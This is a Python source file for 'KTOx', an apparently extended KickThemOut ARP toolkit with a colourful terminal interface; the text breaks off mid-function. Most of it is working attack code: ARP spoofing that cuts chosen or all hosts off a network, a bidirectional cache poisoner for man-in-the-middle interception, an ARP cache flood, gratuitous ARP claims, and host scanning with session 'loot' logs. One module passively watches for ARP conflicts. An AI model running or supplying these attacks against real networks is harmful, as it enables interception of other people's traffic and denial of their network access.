#!/usr/bin/env python3
# -.- coding: utf-8 -.-
# ktox.py — KickThemOut eXtended | ARP Toolkit | Blood-Red Industrial TUI

"""
KTOx — ARP Network Control Suite v4.0
Built on KickThemOut (Kamarinakis & Schütz)
Extended by wickednull

Modules:
  · Kick ONE / SOME / ALL  — ARP denial-of-service
  · ARP Cache Poisoner      — MITM bidirectional intercept
  · ARP Flood               — saturate target ARP cache
  · Gratuitous ARP          — broadcast IP claim
  · ARP Watch               — passive conflict monitor
  · Network Scan            — host discovery table
  · Target Recon            — port scan + MAC/vendor enum
  · ARP Table Snapshot      — dump OS ARP table to loot
  · Session logging         — all events written to loot file
"""

import os, sys, time, threading, logging, math, socket, json
from datetime import datetime
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.text import Text
    from rich.prompt import Prompt, Confirm
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from rich.align import Align
    from rich import box
    from rich.rule import Rule
except ImportError:
    print("ERROR: 'rich' not installed. Run: pip3 install rich")
    sys.exit(1)

try:
    from scapy.all import *
    from scapy.config import conf as sconf
    sconf.ipv6_enabled = False
    import nmap
    import scan, spoof
except ImportError as e:
    print(f"ERROR: Missing dependency — {e}")
    sys.exit(1)

# ── Palette ───────────────────────────────────────────────────────────────────
C_BLOOD  = "#C0392B"
C_RUST   = "#922B21"
C_EMBER  = "#E74C3C"
C_STEEL  = "#717D7E"
C_ASH    = "#ABB2B9"
C_WHITE  = "#F2F3F4"
C_DIM    = "#566573"
C_ORANGE = "#CA6F1E"
C_YELLOW = "#D4AC0D"
C_GOOD   = "#1E8449"

console = Console(highlight=False)

BANNER = r"""
 ██╗  ██╗████████╗ ██████╗ ██╗  ██╗
 ██║ ██╔╝╚══██╔══╝██╔═══██╗╚██╗██╔╝
 █████╔╝    ██║   ██║   ██║ ╚███╔╝
 ██╔═██╗    ██║   ██║   ██║ ██╔██╗
 ██║  ██╗   ██║   ╚██████╔╝██╔╝ ██╗
 ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
"""
TAGLINE = "ARP Network Control Suite  ·  authorized eyes only"
VERSION = "v4.0-ktox"

# ── Global State ──────────────────────────────────────────────────────────────
hosts_list          = []
online_ips          = []
default_interface   = None
default_iface_mac   = None
default_gateway_ip  = None
default_gateway_mac = None
gateway_mac_set     = False
stop_flag           = threading.Event()

# ── Session Logger ─────────────────────────────────────────────────────────────
LOG_DIR  = "ktox_loot"
LOG_FILE = None

def init_logger():
    global LOG_FILE
    os.makedirs(LOG_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    LOG_FILE = os.path.join(LOG_DIR, f"session_{ts}.log")
    _write_log("SESSION_START", {"version": VERSION, "pid": os.getpid()})

def _write_log(event, data=None):
    if not LOG_FILE:
        return
    entry = {
        "ts":    datetime.now().isoformat(),
        "event": event,
        "data":  data or {}
    }
    try:
        with open(LOG_FILE, "a") as f:
            f.write(json.dumps(entry) + "\n")
    except:
        pass

def log(event, **kwargs):
    _write_log(event, kwargs)

# ── UI Helpers ─────────────────────────────────────────────────────────────────
def tag(text, color=C_BLOOD):
    return f"[{color}]{text}[/{color}]"

def warn(text):
    console.print(f"\n  [{C_ORANGE}]⚠  {text}[/{C_ORANGE}]")

def err(text):
    console.print(f"\n  [{C_BLOOD}]✖  {text}[/{C_BLOOD}]")

def ok(text):
    console.print(f"\n  [{C_GOOD}]✔  {text}[/{C_GOOD}]")

def section(title):
    console.print()
    console.print(Rule(f"[bold {C_BLOOD}] {title} [/bold {C_BLOOD}]", style=C_RUST))
    console.print()

def shutdown():
    log("SESSION_END")
    section("SHUTDOWN")
    if LOG_FILE:
        console.print(f"  [{C_STEEL}]Session log saved → [{C_ASH}]{LOG_FILE}[/{C_ASH}][/{C_STEEL}]")
    console.print(f"  [{C_DIM}]Exiting.[/{C_DIM}]\n")
    os._exit(0)

def draw_banner():
    os.system("clear||cls")
    console.print(Align.center(Text(BANNER,  style=f"bold {C_BLOOD}")))
    console.print(Align.center(Text(TAGLINE, style=C_STEEL)))
    console.print(Align.center(Text(VERSION, style=f"dim {C_DIM}")))
    console.print()
    console.print(Rule(style=C_RUST))
    console.print()

def ask_packets(default=6):
    try:
        val = Prompt.ask(
            f"  [{C_STEEL}]Packets/min per target [{C_DIM}]default={default}[/{C_DIM}][/{C_STEEL}]",
            default=str(default)
        )
        ppm = int(val)
    except KeyboardInterrupt:
        return default, 0
    except:
        warn(f"Invalid — using {default}")
        return default, 0

    try:
        cap = Prompt.ask(
            f"  [{C_STEEL}]Total packet cap [{C_DIM}]0=unlimited[/{C_DIM}][/{C_STEEL}]",
            default="0"
        )
        max_pkts = int(cap)
    except KeyboardInterrupt:
        return ppm, 0
    except:
        max_pkts = 0

    return ppm, max_pkts

# ── Network Helpers ────────────────────────────────────────────────────────────
def long2net(arg):
    if arg <= 0 or arg >= 0xFFFFFFFF:
        raise ValueError("illegal netmask", hex(arg))
    return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))

def to_cidr(bytes_network, bytes_netmask):
    network = scapy.utils.ltoa(bytes_network)
    netmask = long2net(bytes_netmask)
    if netmask < 16:
        return None
    return f"{network}/{netmask}"

def get_default_interface(return_net=False):
    routes = [r for r in scapy.config.conf.route.routes
              if r[3] == scapy.config.conf.iface and r[1] != 0xFFFFFFFF]
    network, netmask, _, interface, address, _ = max(routes, key=lambda x: x[1])
    net = to_cidr(network, netmask)
    if net:
        return net if return_net else interface

def get_iface_mac(iface):
    try:
        mac = get_if_hwaddr(iface)
        if mac:
            return mac
    except:
        pass
    try:
        return Prompt.ask(f"  [{C_ORANGE}]Enter interface MAC manually[/{C_ORANGE}]")
    except KeyboardInterrupt:
        shutdown()

def get_gateway_ip():
    # Method 1: netifaces (most reliable cross-platform)
    try:
        import netifaces
        gws = netifaces.gateways()
        gw = gws.get("default", {}).get(netifaces.AF_INET, [None])[0]
        if gw:
            return gw
    except:
        pass
    # Method 2: scapy route table
    try:
        gw = scapy.config.conf.route.route("0.0.0.0")[2]
        if gw and gw != "0.0.0.0":
            return gw
    except:
        pass
    # Method 3: ip route subprocess
    try:
        import subprocess as _sp
        out = _sp.check_output(["ip", "route"], text=True)
        for line in out.splitlines():
            if line.startswith("default") and "via" in line:
                parts = line.split()
                return parts[parts.index("via") + 1]
    except:
        pass
    # Method 4: route -n subprocess
    try:
        import subprocess as _sp
        out = _sp.check_output(["route", "-n"], text=True)
        for line in out.splitlines():
            parts = line.split()
            if len(parts) >= 2 and parts[0] == "0.0.0.0":
                return parts[1]
    except:
        pass
    # Manual fallback
    try:
        return Prompt.ask(f"  [{C_ORANGE}]Gateway IP not detected — enter manually[/{C_ORANGE}]")
    except KeyboardInterrupt:
        shutdown()

def retrieve_mac(ip):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
        for _, rcv in ans:
            return rcv[Ether].src
    except:
        pass
    return None

# ── Local OUI prefix table (top ~60 vendors, no network needed) ──────────────
_OUI = {
    "00:00:0C":"Cisco","00:1A:A0":"Dell","00:1B:21":"Intel","00:1D:09":"Dell",
    "00:21:6A":"Cisco","00:23:AE":"Cisco","00:25:9C":"Cisco","00:50:56":"VMware",
    "00:0C:29":"VMware","00:05:69":"VMware","00:1C:42":"Parallels",
    "08:00:27":"VirtualBox","0A:00:27":"VirtualBox",
    "B8:27:EB":"Raspberry Pi","DC:A6:32":"Raspberry Pi","E4:5F:01":"Raspberry Pi",
    "28:CD:C1":"Raspberry Pi","D8:3A:DD":"Raspberry Pi",
    "00:17:F2":"Apple","00:1C:B3":"Apple","00:1E:52":"Apple","00:1F:F3":"Apple",
    "00:23:12":"Apple","00:23:32":"Apple","00:23:DF":"Apple","00:24:36":"Apple",
    "00:25:00":"Apple","00:25:4B":"Apple","00:25:BC":"Apple","00:26:08":"Apple",
    "00:26:4A":"Apple","00:26:B9":"Apple","00:26:BB":"Apple","00:30:65":"Apple",
    "04:0C:CE":"Apple","04:15:52":"Apple","04:26:65":"Apple","04:54:53":"Apple",
    "04:D3:CF":"Apple","08:66:98":"Apple","08:70:45":"Apple","0C:3E:9F":"Apple",
    "0C:74:C2":"Apple","10:40:F3":"Apple","18:AF:61":"Apple","1C:AB:A7":"Apple",
    "20:78:F0":"Apple","28:37:37":"Apple","3C:07:54":"Apple","3C:D0:F8":"Apple",
    "40:6C:8F":"Apple","44:FB:42":"Apple","48:43:7C":"Apple","54:26:96":"Apple",
    "58:B0:35":"Apple","5C:59:48":"Apple","60:F8:1D":"Apple","64:B9:E8":"Apple",
    "68:09:27":"Apple","6C:40:08":"Apple","70:56:81":"Apple","70:73:CB":"Apple",
    "74:E1:B6":"Apple","7C:11:BE":"Apple","80:BE:05":"Apple","84:38:35":"Apple",
    "88:1F:A1":"Apple","8C:7B:9D":"Apple","90:3C:92":"Apple","98:FE:94":"Apple",
    "A4:B1:97":"Apple","A8:BE:27":"Apple","AC:87:A3":"Apple","B8:78:2E":"Apple",
    "BC:52:B7":"Apple","BC:9F:EF":"Apple","C8:2A:14":"Apple","CC:29:F5":"Apple",
    "D0:25:98":"Apple","D4:9A:20":"Apple","D8:00:4D":"Apple","E0:AC:CB":"Apple",
    "E4:CE:8F":"Apple","E8:8D:28":"Apple","F0:18:98":"Apple","F4:1B:A1":"Apple",
    "F8:27:93":"Apple","FC:25:3F":"Apple",
    "00:15:5D":"Microsoft","28:18:78":"Microsoft","50:1A:C5":"Microsoft",
    "00:16:3E":"Xen/AWS","06:6A:74":"AWS","0E:AB:F0":"AWS",
    "00:1A:11":"Google","54:60:09":"Google","F4:F5:D8":"Google",
    "18:B4:30":"Nest","64:16:66":"Nest",
    "00:17:88":"Philips Hue","EC:B5:FA":"Philips Hue",
    "B0:4E:26":"Huawei","00:18:82":"Huawei","00:E0:FC":"Huawei",
    "00:90:4C":"Epigram/Broadcom","00:10:18":"Broadcom",
    "00:26:5A":"Netgear","00:14:6C":"Netgear","20:4E:7F":"Netgear",
    "A0:40:A0":"Netgear","C0:3F:0E":"Netgear",
    "00:18:E7":"TP-Link","00:1D:0F":"TP-Link","50:C7:BF":"TP-Link",
    "B0:4E:26":"TP-Link","F4:F2:6D":"TP-Link",
    "00:22:6B":"Linksys","00:23:69":"Linksys","48:F8:B3":"Linksys",
    "00:1A:2B":"Asus","00:1D:60":"Asus","10:BF:48":"Asus","2C:FD:A1":"Asus",
    "00:24:8C":"Asus","90:E6:BA":"Asus","AC:22:0B":"Asus",
    "00:1B:FC":"ASRock","00:22:4E":"ASRock",
    "00:1F:C6":"Samsung","00:23:39":"Samsung","00:23:99":"Samsung",
    "10:D5:42":"Samsung","30:19:66":"Samsung","50:01:BB":"Samsung",
    "6C:AD:F8":"Samsung","8C:77:12":"Samsung","A0:0B:BA":"Samsung",
    "00:0F:50":"Wistron","00:15:00":"Foxconn","00:16:36":"Foxconn",
    "00:19:99":"Wistron","00:23:54":"Pegatron","00:26:18":"Pegatron",
    "74:86:7A":"HTC","AC:37:43":"HTC",
    "00:21:CC":"Motorola","AC:C1:EE":"Motorola",
    "00:15:A0":"Belkin","00:17:3F":"Belkin","00:30:BD":"Belkin",
    "1C:1B:0D":"Belkin",
    "00:04:ED":"Ubiquiti","04:18:D6":"Ubiquiti","24:A4:3C":"Ubiquiti",
    "44:D9:E7":"Ubiquiti","68:72:51":"Ubiquiti","80:2A:A8":"Ubiquiti",
    "00:13:49":"Sony","00:1A:80":"Sony","00:1D:BA":"Sony","00:24:BE":"Sony",
    "00:04:20":"Slim Devices","00:0D:93":"Apple (Xserve)",
    "00:11:24":"Apple","00:0A:95":"Apple","00:11:92":"D-Link",
    "00:15:E9":"D-Link","00:1B:11":"D-Link","00:1C:F0":"D-Link",
    "00:21:91":"D-Link","00:22:B0":"D-Link","00:26:5A":"D-Link",
    "1C:7E:E5":"D-Link","28:10:7B":"D-Link","90:94:E4":"D-Link",
    "00:0F:66":"Actiontec","00:18:01":"Actiontec",
    "00:04:0E":"Motorola (cable)","00:0C:E5":"Motorola (cable)",
    "74:44:01":"Amazon","FC:A6:67":"Amazon","40:B4:CD":"Amazon",
    "34:D2:70":"Amazon","68:37:E9":"Amazon","A0:02:DC":"Amazon",
    "00:BB:3A":"Amazon",
}

def resolve_vendor(mac):
    if not mac or mac == "N/A":
        return "—"
    prefix = mac.upper()[:8]
    v = _OUI.get(prefix)
    if v:
        return v
    # Try 6-char prefix (some entries)
    v = _OUI.get(mac.upper()[:5] + "0")
    if v:
        return v
    return "—"

def resolve_hostname(ip):
    # Try reverse DNS first (fast timeout)
    try:
        old_timeout = socket.getdefaulttimeout()
        socket.setdefaulttimeout(0.5)
        name = socket.gethostbyaddr(ip)[0]
        socket.setdefaulttimeout(old_timeout)
        if name and name != ip:
            return name[:22]
    except:
        pass
    # Try NetBIOS name query via nmblookup if available
    try:
        import subprocess as _sp
        out = _sp.check_output(
            ["nmblookup", "-A", ip], text=True, timeout=1,
            stderr=_sp.DEVNULL
        )
        for line in out.splitlines():
            line = line.strip()
            if line and not line.startswith("Looking") and "<00>" in line:
                return line.split()[0][:22]
    except:
        pass
    return "—"

# ── Scanning ───────────────────────────────────────────────────────────────────
def do_scan():
    global hosts_list, online_ips, default_gateway_mac, gateway_mac_set
    with Progress(
        SpinnerColumn(spinner_name="dots", style=C_BLOOD),
        TextColumn(f"[{C_STEEL}]Sweeping network...[/{C_STEEL}]"),
        transient=True,
    ) as prog:
        prog.add_task("scan")
        hosts_list = scan.scanNetwork(get_default_interface(True))

    online_ips = [h[0] for h in hosts_list]
    log("SCAN_COMPLETE", hosts=online_ips, count=len(hosts_list))

    if not gateway_mac_set:
        default_gateway_mac = ""
        for host in hosts_list:
            if host[0] == default_gateway_ip:
                default_gateway_mac = host[1]
        if not default_gateway_mac:
            try:
                default_gateway_mac = Prompt.ask(
                    f"  [{C_ORANGE}]Gateway MAC not found — enter manually[/{C_ORANGE}]"
                )
            except KeyboardInterrupt:
                shutdown()
            gateway_mac_set = True

def print_host_table(highlight_ips=None):
    # Detect terminal width and adapt
    try:
        term_w = os.get_terminal_size().columns
    except:
        term_w = 80

    narrow = term_w < 90

    table = Table(
        box=box.SIMPLE,
        border_style=C_RUST,
        header_style=f"bold {C_BLOOD}",
        show_lines=False,
        padding=(0, 1),
        expand=False,
    )

    if narrow:
        # Minimal columns for small screens
        table.add_column("#",  style=f"bold {C_BLOOD}", no_wrap=True, min_width=2, max_width=3)
        table.add_column("IP", style=C_WHITE,           no_wrap=True, min_width=11, max_width=15)
        table.add_column("MAC",style=C_STEEL,           no_wrap=True, min_width=11, max_width=17)
        table.add_column("ST", style=C_GOOD,            no_wrap=True, min_width=2,  max_width=3)
    else:
        table.add_column("#",       style=f"bold {C_BLOOD}", no_wrap=True, min_width=2,  max_width=3)
        table.add_column("IP",      style=C_WHITE,           no_wrap=True, min_width=13, max_width=16)
        table.add_column("MAC",     style=C_STEEL,           no_wrap=True, min_width=17, max_width=17)
        table.add_column("VENDOR",  style=C_DIM,             no_wrap=True, min_width=8,  max_width=16)
        table.add_column("HOST",    style=C_DIM,             no_wrap=True, min_width=8,  max_width=18)
        table.add_column("ST",      style=C_GOOD,            no_wrap=True, min_width=2,  max_width=3)

    for i, host in enumerate(hosts_list):
        ip       = host[0]
        mac      = host[1]
        is_gw    = ip == default_gateway_ip
        is_sel   = highlight_ips and ip in highlight_ips
        ip_style = f"bold {C_EMBER}" if is_sel else (f"bold {C_YELLOW}" if is_gw else C_WHITE)
        status   = f"[{C_YELLOW}]GW[/{C_YELLOW}]" if is_gw else f"[{C_GOOD}]OK[/{C_GOOD}]"

        if narrow:
            # Shorten MAC for narrow display: AA:BB:CC:..
            short_mac = mac[:11] if mac else "—"
            table.add_row(
                f"[bold {C_BLOOD}]{i}[/bold {C_BLOOD}]",
                f"[{ip_style}]{ip}[/{ip_style}]",
                short_mac, status
            )
        else:
            vendor   = resolve_vendor(mac)
            hostname = resolve_hostname(ip)
            table.add_row(
                f"[bold {C_BLOOD}]{i}[/bold {C_BLOOD}]",
                f"[{ip_style}]{ip}[/{ip_style}]",
                mac, vendor, hostname, status
            )
    console.print(table)

def resolve_targets(indices):
    result = []
    for idx in indices:
        host = hosts_list[idx]
        ip   = host[0]
        mac  = host[1] or retrieve_mac(ip)
        result.append((ip, mac))
    return result

# ── ARP Kick Engine ────────────────────────────────────────────────────────────
def _spoof_loop(targets, ppm, max_packets=0):
    """
    ppm        = packets per minute PER TARGET
    max_packets = total packet cap (0 = unlimited)
    interval   = sleep between each individual sendPacket call
    """
    interval = (60.0 / float(ppm)) if ppm else 10.0
    sent = 0
    while not stop_flag.is_set():
        for ip, mac in targets:
            if stop_flag.is_set():
                break
            if mac:
                spoof.sendPacket(default_iface_mac, default_gateway_ip, ip, mac)
                sent += 1
                if max_packets > 0 and sent >= max_packets:
                    stop_flag.set()
                    log("SPOOF_LOOP_END", packets_sent=sent, reason="packet_cap_reached")
                    return
            time.sleep(interval)
    log("SPOOF_LOOP_END", packets_sent=sent, reason="stopped")

def re_arp(targets):
    console.print(f"\n  [{C_ORANGE}]Re-ARPing — restoring legitimate tables...[/{C_ORANGE}]")
    for _ in range(10):
        for ip, mac in targets:
            if mac:
                try:
                    spoof.sendPacket(default_gateway_mac, default_gateway_ip, ip, mac)
                except:
                    pass
        time.sleep(0.2)
    ok("ARP tables restored.")
    log("REARP_COMPLETE", targets=[ip for ip, _ in targets])

def run_attack(targets, label_str, ppm=None, max_packets=0):
    stop_flag.clear()
    t = threading.Thread(target=_spoof_loop, args=(targets, ppm, max_packets), daemon=True)
    t.start()
    ip_list = ", ".join(ip for ip, _ in targets)
    rate    = f"{ppm} pkts/min" if ppm else "6 pkts/min (default)"
    cap_str = f"  cap={max_packets}" if max_packets > 0 else "  unlimited"
    log("ATTACK_START", mode=label_str, targets=ip_list, rate=rate, cap=max_packets)

    section(f"ATTACK ACTIVE — {label_str}")
    console.print(Panel(
        f"  {tag('Targets:', C_BLOOD)}  [{C_WHITE}]{ip_list}[/{C_WHITE}]\n"
        f"  {tag('Rate:',    C_STEEL)}    [{C_ASH}]{rate}[/{C_ASH}]\n"
        f"  {tag('Cap:',     C_STEEL)}    [{C_ASH}]{max_packets if max_packets else 'unlimited'}[/{C_ASH}]\n"
        f"  {tag('Mode:',    C_STEEL)}    [{C_ASH}]ARP Poison (gateway spoof)[/{C_ASH}]\n\n"
        f"  [{C_DIM}]Ctrl+C to stop and re-ARP targets[/{C_DIM}]",
        border_style=C_RUST,
        title=f"[bold {C_BLOOD}]◈ SPOOFING[/bold {C_BLOOD}]",
        padding=(1, 2),
    ))
    try:
        elapsed = 0
        while t.is_alive():
            console.print(
                f"  [{C_DIM}][{elapsed:>5}s][/{C_DIM}]  "
                f"[{C_STEEL}]~{max(1, elapsed // max(1, int(60 / (ppm or 6))))} pkts sent[/{C_STEEL}]",
                end="\r"
            )
            time.sleep(1)
            elapsed += 1
    except KeyboardInterrupt:
        stop_flag.set()
        t.join(timeout=3)
        re_arp(targets)

# ── MODULE: Kick ONE / SOME / ALL ─────────────────────────────────────────────
def mode_kick_one():
    section("MODULE // KICK ONE")
    do_scan()
    print_host_table()
    idx = int(Prompt.ask(f"  [{C_BLOOD}]Select target index[/{C_BLOOD}]"))
    targets = resolve_targets([idx])
    ppm, cap = ask_packets()
    run_attack(targets, "SINGLE TARGET", ppm, cap)

def mode_kick_some():
    section("MODULE // KICK SOME")
    do_scan()
    print_host_table()
    raw = Prompt.ask(f"  [{C_BLOOD}]Select targets (comma-separated indices)[/{C_BLOOD}]")
    indices = [int(x.strip()) for x in raw.split(",") if x.strip().isdigit()]
    targets = resolve_targets(indices)
    ppm, cap = ask_packets()
    run_attack(targets, f"{len(targets)} TARGETS", ppm, cap)

def mode_kick_all():
    section("MODULE // KICK ALL")
    do_scan()
    print_host_table()
    if not Confirm.ask(f"  [{C_ORANGE}]Spoof ALL non-gateway hosts?[/{C_ORANGE}]"):
        return
    targets = [(h[0], h[1]) for h in hosts_list if h[0] != default_gateway_ip]
    ppm, cap = ask_packets()
    run_attack(targets, "ALL HOSTS", ppm, cap)

# ── MODULE: ARP Cache Poisoner (MITM) ─────────────────────────────────────────
def mode_mitm():
    section("MODULE // ARP CACHE POISONER  [MITM]")
    console.print(Panel(
        f"  [{C_ASH}]Poisons BOTH the target and the gateway simultaneously.\n"
        f"  Traffic flows through this machine. Enable IP forwarding\n"
        f"  to avoid dropping intercepted packets:\n\n"
        f"  [{C_BLOOD}]echo 1 > /proc/sys/net/ipv4/ip_forward[/{C_BLOOD}][/{C_ASH}]",
        border_style=C_RUST,
        title=f"[bold {C_BLOOD}]◈ MITM MODE[/bold {C_BLOOD}]",
        padding=(1, 2),
    ))

    do_scan()
    print_host_table()

    idx        = int(Prompt.ask(f"  [{C_BLOOD}]Select target index[/{C_BLOOD}]"))
    target_ip  = hosts_list[idx][0]
    target_mac = hosts_list[idx][1] or retrieve_mac(target_ip)
    gw_mac     = default_gateway_mac or retrieve_mac(default_gateway_ip)
    ppm        = ask_packets(default=20)
    interval   = 60.0 / float(ppm)

    log("MITM_START", target=target_ip, gateway=default_gateway_ip, rate=ppm)
    stop_flag.clear()
    sent_count = [0]

    def _mitm_loop():
        while not stop_flag.is_set():
            # Tell target: "I am the gateway"
            sendp(Ether(dst=target_mac) / ARP(
                op=2, pdst=target_ip, hwdst=target_mac,
                psrc=default_gateway_ip, hwsrc=default_iface_mac
            ), verbose=False)
            # Tell gateway: "I am the target"
            sendp(Ether(dst=gw_mac) / ARP(
                op=2, pdst=default_gateway_ip, hwdst=gw_mac,
                psrc=target_ip, hwsrc=default_iface_mac
            ), verbose=False)
            sent_count[0] += 2
            time.sleep(interval)
        log("MITM_END", packets_sent=sent_count[0])

    t = threading.Thread(target=_mitm_loop, daemon=True)
    t.start()

    section("MITM ACTIVE")
    console.print(Panel(
        f"  {tag('Target:',  C_BLOOD)}   [{C_WHITE}]{target_ip}[/{C_WHITE}]  [{C_STEEL}]{target_mac}[/{C_STEEL}]\n"
        f"  {tag('Gateway:', C_STEEL)}   [{C_WHITE}]{default_gateway_ip}[/{C_WHITE}]  [{C_STEEL}]{gw_mac}[/{C_STEEL}]\n"
        f"  {tag('Rate:',    C_STEEL)}   [{C_ASH}]{ppm} pkts/min (bidirectional)[/{C_ASH}]\n\n"
        f"  [{C_DIM}]Ctrl+C to stop and restore both ARP tables[/{C_DIM}]",
        border_style=C_RUST,
        title=f"[bold {C_BLOOD}]◈ INTERCEPTING[/bold {C_BLOOD}]",
        padding=(1, 2),
    ))

    try:
        elapsed = 0
        while t.is_alive():
            console.print(
                f"  [{C_DIM}][{elapsed:>5}s][/{C_DIM}]  "
                f"[{C_STEEL}]{sent_count[0]} pkts sent (bidirectional)[/{C_STEEL}]",
                end="\r"
            )
            time.sleep(1)
            elapsed += 1
    except KeyboardInterrupt:
        stop_flag.set()
        t.join(timeout=3)
        console.print(f"\n  [{C_ORANGE}]Restoring both sides...[/{C_ORANGE}]")
        for _ in range(10):
            try:
                sendp(Ether(dst=target_mac) / ARP(
                    op=2, pdst=target_ip, hwdst=target_mac,
                    psrc=default_gateway_ip, hwsrc=gw_mac
                ), verbose=False)
                sendp(Ether(dst=gw_mac) / ARP(
                    op=2, pdst=default_gateway_ip, hwdst=gw_mac,
                    psrc=target_ip, hwsrc=target_mac
                ), verbose=False)
            except:
                pass
            time.sleep(0.2)
        ok("Both ARP tables restored.")
        log("MITM_REARP_COMPLETE")

# ── MODULE: ARP Flood ──────────────────────────────────────────────────────────
def mode_arp_flood():
    section("MODULE // ARP FLOOD  [DoS]")
    console.print(Panel(
        f"  [{C_ASH}]Floods the target with randomised ARP replies,\n"
        f"  saturating its ARP cache. Effective against embedded\n"
        f"  devices, routers, and hosts with small ARP tables.[/{C_ASH}]",
        border_style=C_RUST,
        title=f"[bold {C_BLOOD}]◈ ARP FLOOD[/bold {C_BLOOD}]",
        padding=(1, 2),
    ))

    target_ip  = Prompt.ask(f"  [{C_BLOOD}]Target IP[/{C_BLOOD}]")
    target_mac = retrieve_mac(target_ip)
    if not target_mac:
        err(f"Could not resolve MAC for {target_ip}")
        return

    rate     = int(Prompt.ask(
        f"  [{C_STEEL}]Packets per second [{C_DIM}]default=100[/{C_DIM}][/{C_STEEL}]",
        default="100"
    ))
    interval = 1.0 / float(rate)
    log("FLOOD_START", target=target_ip, rate_pps=rate)
    stop_flag.clear()
    sent_count = [0]

    def _flood_loop():
        import random
        while not stop_flag.is_set():
            fake_ip  = ".".join(str(random.randint(1, 254)) for _ in range(4))
            fake_mac = ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))
            sendp(Ether(dst=target_mac) / ARP(
                op=2, pdst=target_ip, hwdst=target_mac,
                psrc=fake_ip, hwsrc=fake_mac
            ), verbose=False)
            sent_count[0] += 1
            time.sleep(interval)
        log("FLOOD_END", packets_sent=sent_count[0])

    t = threading.Thread(target=_flood_loop, daemon=True)
    t.start()

    section("ARP FLOOD ACTIVE")
    console.print(Panel(
        f"  {tag('Target:',  C_BLOOD)}   [{C_WHITE}]{target_ip}[/{C_WHITE}]  [{C_STEEL}]{target_mac}[/{C_STEEL}]\n"
        f"  {tag('Rate:',    C_STEEL)}   [{C_ASH}]{rate} pkts/sec[/{C_ASH}]\n"
        f"  {tag('Payload:', C_STEEL)}   [{C_ASH}]randomised IP/MAC pairs[/{C_ASH}]\n\n"
        f"  [{C_DIM}]Ctrl+C to stop[/{C_DIM}]",
        border_style=C_RUST,
        title=f"[bold {C_BLOOD}]◈ FLOODING[/bold {C_BLOOD}]",
        padding=(1, 2),
    ))

    try:
        elapsed = 0
        while t.is_alive():
            console.print(
                f"  [{C_DIM}][{elapsed:>5}s][/{C_DIM}]  "
                f"[{C_STEEL}]{sent_count[0]} pkts sent[/{C_STEEL}]",
                end="\r"
            )
            time.sleep(1)
            elapsed += 1
    except KeyboardInterrupt:
        stop_flag.set()
        t.join(timeout=2)
        console.print()
        ok(f"Flood stopped. {sent_count[0]} total packets sent.")

# ── MODULE: Gratuitous ARP Broadcaster ────────────────────────────────────────
def mode_gratuitous_arp():
    section("MODULE // GRATUITOUS ARP BROADCASTER")
    console.print(Panel(
        f"  [{C_ASH}]Sends unsolicited ARP replies announcing that\n"
        f"  this machine owns a specified IP address.\n"
        f"  Overwrites ARP cache entries on all listening hosts.[/{C_ASH}]",
        border_style=C_RUST,
        title=f"[bold {C_BLOOD}]◈ GRATUITOUS ARP[/bold {C_BLOOD}]",
        padding=(1, 2),
    ))

    claim_ip = Prompt.ask(f"  [{C_BLOOD}]IP to claim[/{C_BLOOD}]")
    src_mac  = Prompt.ask(
        f"  [{C_STEEL}]Source MAC [{C_DIM}]default=this interface[/{C_DIM}][/{C_STEEL}]",
        default=default_iface_mac
    )
    count    = int(Prompt.ask(
        f"  [{C_STEEL}]Repeat count [{C_DIM}]default=10[/{C_DIM}][/{C_STEEL}]",
        default="10"
    ))
    interval = float(Prompt.ask(
        f"  [{C_STEEL}]Interval seconds [{C_DIM}]default=1.0[/{C_DIM}][/{C_STEEL}]",
        default="1.0"
    ))

    log("GARP_START", claim_ip=claim_ip, src_mac=src_mac, count=count)

    garp = Ether(dst="ff:ff:ff:ff:ff:ff", src=src_mac) / ARP(
        op=2,
        psrc=claim_ip,  hwsrc=src_mac,
        pdst=claim_ip,  hwdst="ff:ff:ff:ff:ff:ff"
    )

    section("GARP BROADCAST")
    console.print(Panel(
        f"  {tag('Claiming IP:', C_BLOOD)}  [{C_WHITE}]{claim_ip}[/{C_WHITE}]\n"
        f"  {tag('Source MAC:',  C_STEEL)}  [{C_ASH}]{src_mac}[/{C_ASH}]\n"
        f"  {tag('Destination:', C_STEEL)}  [{C_ASH}]ff:ff:ff:ff:ff:ff (broadcast)[/{C_ASH}]\n"
        f"  {tag('Repeats:',     C_STEEL)}  [{C_ASH}]{count} × {interval}s[/{C_ASH}]",
        border_style=C_RUST,
        title=f"[bold {C_BLOOD}]◈ BROADCASTING[/bold {C_BLOOD}]",
        padding=(1, 2),
    ))

    try:
        for i in range(1, count + 1):
            sendp(garp, verbose=False)
            console.print(
                f"  [{C_DIM}][{i:>3}/{count}][/{C_DIM}]  "
                f"[{C_STEEL}]GARP sent → {claim_ip} is-at {src_mac}[/{C_STEEL}]"
            )
            log("GARP_SENT", seq=i, claim_ip=claim_ip)
            if i < count:
                time.sleep(interval)
    except KeyboardInterrupt:
        warn("Interrupted.")

    ok(f"Gratuitous ARP complete. {count} packets broadcast.")
    log("GARP_COMPLETE", claim_ip=claim_ip, total=count)

# ── MODULE: ARP Watch ──────────────────────────────────────────────────────────
def mode_arp_watch():
    section("MODULE // ARP WATCH")
    console.print(
        f"  [{C_STEEL}]Passive monitor — alerts on IP↔MAC conflicts. "
        f"[{C_DIM}]Ctrl+C to stop[/{C_DIM}][/{C_STEEL}]\n"
    )
    known = {}
    log("ARPWATCH_START")

    def _sniff(pkt):
        if ARP in pkt and pkt[ARP].op == 2:
            ip  = pkt[ARP].psrc
            mac = pkt[ARP].hwsrc
            ts  = time.strftime("%H:%M:%S")
            if ip in known:
                if known[ip] != mac:
                    console.print(
                        f"  [{C_BLOOD}]⚡ CONFLICT[/{C_BLOOD}]  "
                        f"[{C_WHITE}]{ip}[/{C_WHITE}]  "
                        f"[{C_STEEL}]{known[ip]}[/{C_STEEL}] → "
                        f"[{C_EMBER}]{mac}[/{C_EMBER}]  "
                        f"[{C_DIM}]{ts}[/{C_DIM}]"
                    )
                    log("ARP_CONFLICT", ip=ip, old_mac=known[ip], new_mac=mac)
                    known[ip] = mac
            else:
                known[ip] = mac
                console.print(
